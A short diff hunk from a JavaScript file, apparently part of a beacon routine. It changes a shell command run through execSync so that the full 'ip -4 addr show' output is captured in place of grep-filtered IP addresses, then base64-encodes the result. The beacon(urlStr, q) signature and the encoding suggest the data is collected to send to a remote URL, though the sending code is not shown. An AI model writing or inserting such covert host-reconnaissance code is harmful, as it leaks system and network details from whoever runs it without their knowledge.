@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'ip -4 addr show | grep -oP "(?<=inet\\s)\\d+(\\.\\d+){3}/\\d+"',
+  'ip -4 addr show',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
